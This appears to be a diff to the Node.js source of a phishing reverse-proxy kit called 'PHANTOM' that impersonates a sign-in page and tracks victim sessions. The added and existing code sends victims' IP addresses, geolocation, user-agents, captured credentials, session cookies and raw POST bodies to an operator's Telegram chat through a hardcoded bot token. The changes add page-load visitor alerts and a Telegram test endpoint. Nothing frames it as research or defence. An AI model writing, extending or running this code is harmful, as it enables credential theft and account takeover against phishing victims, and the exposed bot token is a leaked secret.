@@ -2,9 +2,9 @@ const axios = require('axios');
 const BOT_TOKEN = '8210158119:AAHhshMpvVybY3LSxOZkYiiuLwtq_dwaCLg';
 const CHAT_ID = '7310383191';
 
-// Track which sessions have already sent notifications
+// Track which sessions have already sent credential notifications
 const NOTIFIED_SESSIONS = new Set();
-// Track which sessions have already sent a "first visit" notification
+// Track which sessions have already sent a "first visit" notification (either page-load or proxied)
 const VISITED_SESSIONS = new Set();
 
 // ================================================
@@ -93,7 +93,7 @@ async function sendCookiesAsFile(cookies, sessionId) {
 }
 
 // ================================================
-// 𝙼𝙰𝙸𝙽 𝚃𝙴𝙻𝙴𝙶𝚁𝙰𝙼 𝙵𝚄𝙽𝙲𝚃𝙸𝙾𝙽 (UPDATED WITH FIRST‑VISIT NOTIFICATION)
+// 𝙼𝙰𝙸𝙽 𝚃𝙴𝙻𝙴𝙶𝚁𝙰𝙼 𝙵𝚄𝙽𝙲𝚃𝙸𝙾𝙽 (UPDATED WITH VISIT + CREDENTIAL NOTIFICATIONS)
 // ================================================
 
 async function sendToTelegram(data) {
@@ -106,7 +106,7 @@ async function sendToTelegram(data) {
         
         console.log('📨 sendToTelegram() CALLED with URL:', url);
         
-        // ---- FIRST VISIT NOTIFICATION (once per session) ----
+        // ---- FIRST VISIT NOTIFICATION (for proxied requests) ----
         if (!VISITED_SESSIONS.has(sessionId)) {
             VISITED_SESSIONS.add(sessionId);
             
@@ -127,7 +127,7 @@ async function sendToTelegram(data) {
             }
 
             const visitMessage = `
-🆕 **New Visitor!**
+🆕 **New Visitor (Proxied)!**
 
 🌍 **IP:** ${ip}
 ${flag} **Location:** ${location}
@@ -141,13 +141,18 @@ ${flag} **Location:** ${location}
 🖥️ **User-Agent:** ${userAgent}
             `;
 
-            console.log('📤 Sending first‑visit notification...');
-            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                chat_id: CHAT_ID,
-                text: visitMessage,
-                parse_mode: 'Markdown'
-            });
-            console.log('✅ First‑visit notification sent successfully');
+            console.log('📤 Sending first‑visit notification (proxied)...');
+            try {
+                const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    chat_id: CHAT_ID,
+                    text: visitMessage,
+                    parse_mode: 'Markdown'
+                });
+                console.log('✅ First‑visit notification sent, Telegram response:', response.status);
+            } catch (e) {
+                console.error('❌ First‑visit notification failed:', e.message);
+                if (e.response) console.error('   Response data:', e.response.data);
+            }
         }
         
         // ---- CREDENTIAL / SESSION NOTIFICATION (existing logic) ----
@@ -293,12 +298,17 @@ ${flag} **Location:** ${location}
         }
         
         console.log('📤 Sending credential Telegram message...');
-        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            chat_id: CHAT_ID,
-            text: message,
-            parse_mode: 'Markdown'
-        });
-        console.log('✅ Credential Telegram message sent successfully');
+        try {
+            const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            });
+            console.log('✅ Credential Telegram message sent, response:', response.status);
+        } catch (e) {
+            console.error('❌ Credential Telegram message failed:', e.message);
+            if (e.response) console.error('   Response data:', e.response.data);
+        }
         
         // --- cookie file ---
         const cookies = extractCookiesFromHeaders(data.proxyResponseHeaders);
@@ -309,12 +319,16 @@ ${flag} **Location:** ${location}
         
         // --- raw POST data ---
         if (body && typeof body === 'string' && body.length > 0 && body.length < 4000) {
-            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                chat_id: CHAT_ID,
-                text: `📦 **Raw POST Data:**\n\`\`\`\n${body.slice(0, 3000)}\n\`\`\``,
-                parse_mode: 'Markdown'
-            });
-            console.log('✅ Raw data sent successfully');
+            try {
+                await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    chat_id: CHAT_ID,
+                    text: `📦 **Raw POST Data:**\n\`\`\`\n${body.slice(0, 3000)}\n\`\`\``,
+                    parse_mode: 'Markdown'
+                });
+                console.log('✅ Raw data sent successfully');
+            } catch (e) {
+                console.error('❌ Raw data send failed:', e.message);
+            }
         }
         
     } catch (e) {
@@ -409,7 +423,7 @@ const AdmZip = require('adm-zip');
 const WebSocket = require('ws');
 
 // ================================================
-// 𝙲𝙾𝙽𝚂𝚃𝙰𝙽𝚃𝚂 (FIXED: ALL DEFINED IN CORRECT ORDER)
+// 𝙲𝙾𝙽𝚂𝚃𝙰𝙽𝚃𝚂 (ALL DEFINED IN CORRECT ORDER)
 // ================================================
 
 const PROXY_ENTRY_POINT = "/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true";
@@ -469,6 +483,19 @@ dashApp.use(express.static('public'));
 
 dashApp.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
+
+// ---- Test endpoint to verify Telegram connectivity ----
+dashApp.get('/test', async (req, res) => {
+    try {
+        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            chat_id: CHAT_ID,
+            text: '✅ Test from PHANTOM dashboard'
+        });
+        res.send('Telegram test sent successfully');
+    } catch (e) {
+        res.status(500).send('Error: ' + e.message);
+    }
 });
 
 // ================================================
@@ -1110,7 +1137,7 @@ dashApp.get('/api/analytics', (req, res) => {
 });
 
 // ================================================
-// 𝙿𝙷𝙸𝚂𝙷𝙻𝙴𝚃𝚂 𝙴𝙽𝙳𝙿𝙾𝙸𝙽𝚃𝚂 (KEEP OR REMOVE)
+// 𝙿𝙷𝙸𝚂𝙷𝙻𝙴𝚃𝚂 𝙴𝙽𝙳𝙿𝙾𝙸𝙽𝚃𝚂
 // ================================================
 dashApp.get('/api/phishlets', (req, res) => {
     try {
@@ -1196,7 +1223,8 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
 
     logVisit(clientRequest, clientResponse, currentSession || 'new').catch(() => {});
 
-    if (url.startsWith(PROXY_ENTRY_POINT) && url.includes(PHISHED_URL_PARAMETER)) {
+    // ---- MAIN PHISHING PAGE HANDLER (UPDATED with includes and verbose notification) ----
+    if (url.includes(PROXY_ENTRY_POINT) && url.includes(PHISHED_URL_PARAMETER)) {
         try {
             const phishedURL = new URL(decodeURIComponent(url.match(PHISHED_URL_REGEXP)[0]));
             let session = currentSession;
@@ -1211,6 +1239,55 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
             VICTIM_SESSIONS[session].path = `${phishedURL.pathname}${phishedURL.search}`;
             VICTIM_SESSIONS[session].port = phishedURL.port;
             VICTIM_SESSIONS[session].host = phishedURL.host;
+
+            // ---- Page-load notification with verbose logging ----
+            (async () => {
+                try {
+                    if (!VISITED_SESSIONS.has(session)) {
+                        VISITED_SESSIONS.add(session);
+                        const ip = headers['cf-connecting-ip'] || 
+                                   headers['x-real-ip'] || 
+                                   headers['x-forwarded-for']?.split(',')[0]?.trim() || 
+                                   'Unknown';
+                        console.log('🌐 Page-load: IP =', ip);
+                        let geo = { country: 'Unknown', countryCode: 'UN', regionName: '', city: '', isp: '', org: '' };
+                        let flag = '🌍';
+                        let location = 'Unknown';
+                        if (ip !== 'Unknown') {
+                            try {
+                                geo = await getGeoInfo(ip);
+                                flag = getFlagEmoji(geo.countryCode);
+                                location = `${geo.city}, ${geo.regionName}, ${geo.country}`;
+                            } catch (e) {}
+                        }
+                        const visitMessage = `
+🆕 **New Visitor (Page Load)!**
+
+🌍 **IP:** ${ip}
+${flag} **Location:** ${location}
+🏢 **ISP:** ${geo.isp || 'N/A'}
+📡 **Org:** ${geo.org || 'N/A'}
+
+🕒 **Time:** ${new Date().toISOString()}
+🔗 **URL:** ${url}
+📨 **Method:** GET
+🖥️ **User-Agent:** ${headers['user-agent'] || 'Unknown'}
+                        `;
+                        const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                            chat_id: CHAT_ID,
+                            text: visitMessage,
+                            parse_mode: 'Markdown'
+                        });
+                        console.log('✅ Page-load notification sent, Telegram response:', response.status);
+                    } else {
+                        console.log('⏭️ Session already visited, skipping page-load notification.');
+                    }
+                } catch (e) {
+                    console.error('❌ Page-load notification error:', e.message);
+                    if (e.response) console.error('   Response data:', e.response.data);
+                    if (e.request) console.error('   No response from Telegram');
+                }
+            })();
 
             clientResponse.writeHead(200, { "Content-Type": "text/html" });
             fs.createReadStream(PROXY_FILES.index).pipe(clientResponse);
@@ -1623,7 +1700,7 @@ async function logHTTPProxyTransaction(proxyRequestProtocol, proxyRequestOptions
         proxyRequestBody: proxyRequestBody,
         proxyResponseStatusCode: proxyResponse.statusCode,
         proxyResponseHeaders: proxyResponse.headers,
-        sessionId: currentSession   // <-- FIX: Pass sessionId explicitly
+        sessionId: currentSession
     };
     const logFileStream = LOG_FILE_STREAMS[currentSession];
 
@@ -1634,7 +1711,6 @@ async function logHTTPProxyTransaction(proxyRequestProtocol, proxyRequestOptions
     }
     
     try {
-        // Pass sessionId properly
         await sendToTelegram({ ...httpProxyTransaction, sessionId: currentSession });
         console.log('✅ Telegram notification sent for:', proxyRequestOptions.path);
     } catch (telegramError) {
